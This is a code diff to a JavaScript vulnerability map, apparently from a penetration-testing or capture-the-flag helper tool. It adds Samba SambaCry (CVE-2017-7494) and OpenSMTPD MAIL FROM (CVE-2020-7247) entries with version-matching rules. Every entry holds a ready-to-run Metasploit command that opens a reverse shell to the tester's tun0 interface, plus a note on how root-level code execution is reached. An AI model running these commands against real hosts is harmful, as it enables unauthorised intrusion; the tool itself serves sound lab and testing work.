@@ -57,12 +57,29 @@ window.CS_VULN_MAP = [
     exploit: `msfconsole -q -x "use exploit/multi/samba/usermap_script; set RHOSTS <TARGET_IP>; set LHOST tun0; run"`,
     note: "The 'username map script' option passes the SMB username straight to a shell — unauthenticated RCE as root.",
   },
+  {
+    // Per-branch spelling, not a numeric range: 4.4.14 / 4.5.10 / 4.6.4 were
+    // patched, so a flat `lt 4.6.4` would wrongly flag the patched 4.4.14+ and
+    // 4.5.10+ builds. This matches only the unambiguously vulnerable spellings
+    // (3.5.x–3.1x.x and 4.0.x–4.3.x); the harder 4.4–4.6 tail is left to a manual
+    // check rather than risk a false positive on a patched point release.
+    svc: "smb", product: /samba|smbd/i, ver: { re: /\b(3\.[5-9]|3\.1\d|4\.[0-3])\./i },
+    title: "Samba 3.5.0–4.3.x is_known_pipename RCE (SambaCry)", id: "CVE-2017-7494", sev: "critical",
+    exploit: `msfconsole -q -x "use exploit/linux/samba/is_known_pipename; set RHOSTS <TARGET_IP>; set RPORT <PORT>; set LHOST tun0; run"`,
+    note: "Upload a shared library to a writable share, then make Samba load it — RCE as the smbd user. Needs an accessible, writable share (set SMB_SHARE_NAME/SMB_FOLDER). Patched in 4.4.14 / 4.5.10 / 4.6.4.",
+  },
   // ── Mail ─────────────────────────────────────────────────────────────────
   {
     svc: "smtp", product: /exim/i, ver: { ge: "4.87", le: "4.91" },
     title: "Exim 4.87–4.91 RCE (Return of the WIZard)", id: "CVE-2019-10149", sev: "critical",
     exploit: `msfconsole -q -x "use exploit/linux/smtp/exim4_deliver_message; set RHOSTS <TARGET_IP>; set RPORT <PORT>; set LHOST tun0; run"`,
     note: "A crafted RCPT TO reaches deliver_message() and runs commands as root. Distros backport the fix — confirm the real build before relying on the banner.",
+  },
+  {
+    svc: "smtp", product: /opensmtpd/i, ver: { ge: "6.4.0", lt: "6.6.2" },
+    title: "OpenSMTPD 6.4.0–6.6.1 MAIL FROM RCE", id: "CVE-2020-7247", sev: "critical",
+    exploit: `msfconsole -q -x "use exploit/unix/smtp/opensmtpd_mail_from_rce; set RHOSTS <TARGET_IP>; set RPORT <PORT>; set LHOST tun0; run"`,
+    note: "A shell metacharacter in the MAIL FROM address reaches execle() and runs as root — exploitable in the default listen-all config. Patched in 6.6.2.",
   },
   // ── IRC ──────────────────────────────────────────────────────────────────
   {
